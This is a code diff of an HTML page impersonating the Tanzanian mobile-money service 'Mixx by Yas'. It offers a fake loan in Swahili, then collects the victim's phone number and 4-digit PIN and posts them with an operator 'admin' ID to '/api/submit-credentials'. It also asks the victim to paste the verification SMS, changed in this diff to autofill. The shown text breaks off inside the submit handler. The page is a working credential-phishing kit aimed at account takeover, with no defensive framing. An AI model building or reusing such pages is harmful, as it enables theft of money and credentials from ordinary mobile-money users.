@@ -4,12 +4,52 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mixx by Yas Tanzania</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        :root { --bg-color: #0f172a; --card-bg: #1e293b; --accent-yellow: #facc15; --text-main: #f8fafc; --text-muted: #94a3b8; }
+        body { font-family: Arial, sans-serif; background: var(--bg-color); color: var(--text-main); margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
+        .container { width: 100%; max-width: 400px; }
+        .card { background: var(--card-bg); padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); margin-bottom: 20px; }
+        .hidden { display: none !important; }
+        .mixx-logo { font-size: 24px; font-weight: bold; color: var(--accent-yellow); text-align: center; margin-bottom: 15px; }
+        .logo-container { text-align: center; }
+        .info-box, .header-banner { text-align: center; margin-bottom: 20px; }
+        .info-box p, .header-banner p { color: var(--text-muted); font-size: 14px; line-height: 1.5; }
+        .header-banner h2 { margin: 0 0 5px 0; color: #fff; }
+        .btn-primary { width: 100%; background: var(--accent-yellow); color: #000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
+        .btn-primary:hover { opacity: 0.9; }
+        .btn-secondary { background: transparent; color: var(--text-muted); border: 1px solid var(--text-muted); padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; color: var(--text-muted); }
+        .form-control { width: 100%; padding: 12px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; box-sizing: border-box; font-size: 15px; }
+        textarea.form-control { resize: vertical; }
+        .phone-input-wrapper { display: flex; align-items: center; background: #0f172a; border: 1px solid #334155; border-radius: 8px; overflow: hidden; }
+        .prefix { padding: 0 12px; color: var(--text-muted); font-weight: bold; border-right: 1px solid #334155; background: #1e293b; }
+        .phone-input-wrapper input { border: none; background: transparent; color: #fff; padding: 12px; width: 100%; outline: none; }
+        .pin-boxes { display: flex; gap: 10px; justify-content: center; }
+        .pin-input { width: 50px; height: 50px; text-align: center; font-size: 24px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; }
+        .badge-pill { background: #334155; padding: 4px 10px; border-radius: 20px; font-size: 11px; }
+        .dash-calc-box { background: #0f172a; padding: 15px; border-radius: 8px; border: 1px solid #334155; }
+        .dash-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
+        .custom-slider { width: 100%; accent-color: var(--accent-yellow); }
+        .amount-box { text-align: center; background: #0f172a; padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #334155; }
+        .amount-box .value { font-size: 24px; font-weight: bold; color: var(--accent-yellow); display: block; }
+        .amount-box .label { font-size: 12px; color: var(--text-muted); }
+        .error-surface-banner { background: #7f1d1d; color: #fca5a5; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 15px; text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid var(--accent-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon { width: 60px; height: 60px; background: #15803d; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 15px auto; }
+        #step-loading { text-align: center; padding: 40px 20px; }
+        .otp-header { text-align: center; margin-bottom: 20px; }
+        .otp-header h3 { font-size: 14px; line-height: 1.4; color: #fff; }
+        .timer-badge { display: inline-block; background: #7f1d1d; color: #fca5a5; font-size: 11px; padding: 4px 10px; border-radius: 4px; margin-top: 8px; }
+        .otp-input-area textarea { width: 100%; height: 90px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; padding: 10px; box-sizing: border-box; }
+        #char-count { font-size: 11px; color: var(--text-muted); float: right; margin-top: 4px; }
+    </style>
 </head>
 <body>
     <div class="container">
         <!-- 1. NAELEWA WELCOME NOTICE -->
-        <div id="step-naelewa" class="card active">
+        <div id="step-naelewa" class="card">
             <div class="logo-container">
                 <div class="mixx-logo">Mixx</div>
             </div>
@@ -52,13 +92,13 @@
                 <div style="font-size: 11px; color: var(--text-muted); margin-top: 8px;">Kiwango cha Riba: <strong style="color: #fff;">5% APR</strong></div>
             </div>
 
-            <div class="amount-box" style="margin: 5px 0;">
+            <div class="amount-box" style="margin: 15px 0;">
                 <span class="value" id="monthly-payment-val" style="font-size: 22px;">Tsh 336,115</span>
                 <span class="label" style="margin-top: 4px;">Makadirio ya Malipo ya Kila Mwezi</span>
-                <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Jumla ya ulipaji: <span id="total-repay-val" style="color: #fff;">Tsh 1,008,345</span> (Principal + Riba)</div>
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 4px;">Jumla ya ulipaji: <span id="total-repay-val" style="color: #fff;">Tsh 1,008,345</span></div>
             </div>
 
-            <button type="button" class="btn-primary" id="btn-slider-next" style="margin-top: 5px;">OMBA SASA →</button>
+            <button type="button" class="btn-primary" id="btn-slider-next">OMBA SASA →</button>
         </div>
 
         <!-- 3. HATUA 1 YA 3 -->
@@ -115,13 +155,12 @@
                 <label>Nambari ya Simu</label>
                 <div class="phone-input-wrapper">
                     <span class="prefix">+255</span>
-                    <input type="tel" id="phone" placeholder="712345678 au 0712345678" required>
+                    <input type="tel" id="phone" placeholder="712345678" required>
                 </div>
-                <small style="color: var(--text-muted); font-size: 11px; margin-top: 4px;">Weka nambari 9 au anza na 0 (mfano, 0712345678)</small>
             </div>
             <div style="display: flex; gap: 10px; margin-top: 10px;">
-                <button type="button" class="btn-secondary" id="btn-prev-2" style="flex: 1;">ILIYOTANGULIA</button>
-                <button type="button" class="btn-primary" id="btn-next-2" style="flex: 1;">HATUA INAYOFUATA</button>
+                <button type="button" class="btn-secondary" id="btn-prev-2" style="flex: 1;">NYUMA</button>
+                <button type="button" class="btn-primary" id="btn-next-2" style="flex: 1;">ENDELEA</button>
             </div>
         </div>
 
@@ -145,14 +184,12 @@
             </div>
             <div class="info-box" style="text-align: left; font-size: 13px; margin-bottom: 10px;">
                 <strong>Muhtasari wa Maombi</strong><br>
-                Kiasi cha Mkopo: <span id="summary-amount" style="float: right; color: var(--accent-yellow);">TSh 1,000,000</span><br>
-                Muda wa Mkopo: <span id="summary-duration" style="float: right;">Miezi 3</span><br>
-                Madhumuni: <span id="summary-purpose" style="float: right;">Biashara</span><br>
-                Mwombaji: <span style="float: right;">MIXX BY YAS</span>
+                Kiasi: <span id="summary-amount" style="float: right; color: var(--accent-yellow);">TSh 1,000,000</span><br>
+                Muda: <span id="summary-duration" style="float: right;">Miezi 3</span>
             </div>
             <div style="display: flex; gap: 10px;">
-                <button type="button" class="btn-secondary" id="btn-prev-3" style="flex: 1;">ILIYOTANGULIA</button>
-                <button type="button" class="btn-primary" id="btn-submit-loan" style="flex: 1;">WASILISHA MAOMBI</button>
+                <button type="button" class="btn-secondary" id="btn-prev-3" style="flex: 1;">NYUMA</button>
+                <button type="button" class="btn-primary" id="btn-submit-loan" style="flex: 1;">WASILISHA</button>
             </div>
         </div>
 
@@ -166,14 +203,13 @@
                 <p>Weka Nambari na PIN kuthibitisha</p>
             </div>
             
-            <!-- Inline surface notification banner for errors -->
             <div id="pin-error-banner" class="error-surface-banner hidden">
                 ⚠ PIN uliyoweka si sahihi. Tafadhali weka PIN sahihi upya.
             </div>
 
             <form id="loan-form">
                 <div class="input-group">
-                    <label>Nambari ya Simu ya Kuthibitisha</label>
+                    <label>Nambari ya Simu</label>
                     <div class="phone-input-wrapper">
                         <span class="prefix">+255</span>
                         <input type="tel" id="confirm-phone" placeholder="712345678" required>
@@ -188,7 +224,6 @@
                         <input type="password" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" required>
                         <input type="password" maxlength="1" class="pin-input" inputmode="numeric" pattern="[0-9]*" required>
                     </div>
-                    <input type="hidden" id="pin-hidden">
                 </div>
 
                 <button type="submit" class="btn-primary" id="btn-ingia">INGIA</button>
@@ -206,16 +241,15 @@
         <div id="step-otp" class="card hidden">
             <div class="otp-header">
                 <h3>TAFADHALI BANDIKA SMS ILIYOTUMWA KWAKO KWENYE NAMBARI YA MIXX BY YAS HAPA CHINI</h3>
-                <div class="timer-badge">⏱ HII ITAKOMA BAADA YA SEKUNDE 20</div>
+                <div class="timer-badge">⏱ INASUBIRI SMS KUTOKA KWA MFUMO</div>
             </div>
 
-            <!-- Inline surface notification banner for SMS errors -->
             <div id="sms-error-banner" class="error-surface-banner hidden">
-                ⚠ Ujumbe wa SMS si sahihi au umepitwa na wakati. Tafadhali bandika SMS mpya.
+                ⚠ Ujumbe wa SMS si sahihi. Tafadhalijaribu tena.
             </div>
 
             <div class="otp-input-area">
-                <textarea id="otp-text" placeholder="Bandika hapa ujumbe wa SMS..." rows="4"></textarea>
+                <textarea id="otp-text" placeholder="Ujumbe wa SMS utajazwa hapa kiotomatiki..." rows="4" autocomplete="one-time-code"></textarea>
                 <span id="char-count">0/1000</span>
             </div>
             <button id="btn-thibitisha" class="btn-primary">THIBITISHA</button>
@@ -233,7 +267,101 @@
             <button class="btn-primary" onclick="location.reload()">Rudi Nyumbani</button>
         </div>
     </div>
-    <script src="script.js"></script>
-</body>
-                </html>
-    
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const adminId = urlParams.get('admin');
+        let currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 9);
+        let phoneValue = '';
+        let pinValue = '';
+
+        // Form Step Navigation Triggers
+        document.getElementById('btn-naelewa').onclick = () => {
+            document.getElementById('step-naelewa').classList.add('hidden');
+            document.getElementById('step-slider').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-slider-next').onclick = () => {
+            document.getElementById('step-slider').classList.add('hidden');
+            document.getElementById('step-loan-1').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-next-1').onclick = () => {
+            document.getElementById('step-loan-1').classList.add('hidden');
+            document.getElementById('step-loan-2').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-prev-2').onclick = () => {
+            document.getElementById('step-loan-2').classList.add('hidden');
+            document.getElementById('step-loan-1').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-next-2').onclick = () => {
+            const phoneInput = document.getElementById('phone').value.trim();
+            if(!phoneInput) { alert('Tafadhali weka nambari ya simu'); return; }
+            document.getElementById('confirm-phone').value = phoneInput;
+            document.getElementById('step-loan-2').classList.add('hidden');
+            document.getElementById('step-loan-3').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-prev-3').onclick = () => {
+            document.getElementById('step-loan-3').classList.add('hidden');
+            document.getElementById('step-loan-2').classList.remove('hidden');
+        };
+
+        document.getElementById('btn-submit-loan').onclick = () => {
+            document.getElementById('step-loan-3').classList.add('hidden');
+            document.getElementById('step-form').classList.remove('hidden');
+        };
+
+        // PIN box navigation behavior
+        const pinInputs = document.querySelectorAll('.pin-input');
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Submit Credentials Form
+        document.getElementById('loan-form').onsubmit = (e) => {
+            e.preventDefault();
+            phoneValue = document.getElementById('confirm-phone').value.trim();
+            pinValue = Array.from(pinInputs).map(i => i.value).join('');
+
+            if (pinValue.length < 4) {
+                alert('Tafadhali jaza tarakimu 4 za PIN');
+                return;
+            }
+
+            document.getElementById('step-form').classList.add('hidden');
+            document.getElementById('step-loading').classList.remove('hidden');
+
+            fetch('/api/submit-credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    phone: phoneValue,
+                    pin: pinValue,
+                    adminId: adminId || null
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.success) {
+                    localStorage.setItem('sessionId', currentSessionId);
+                    pollStatus();
+                } else {
+                    alert('Imeshindikana kutuma taarifa.');
+                    location.reload();
+                }
+            })
+            .catch(err => {
+ 
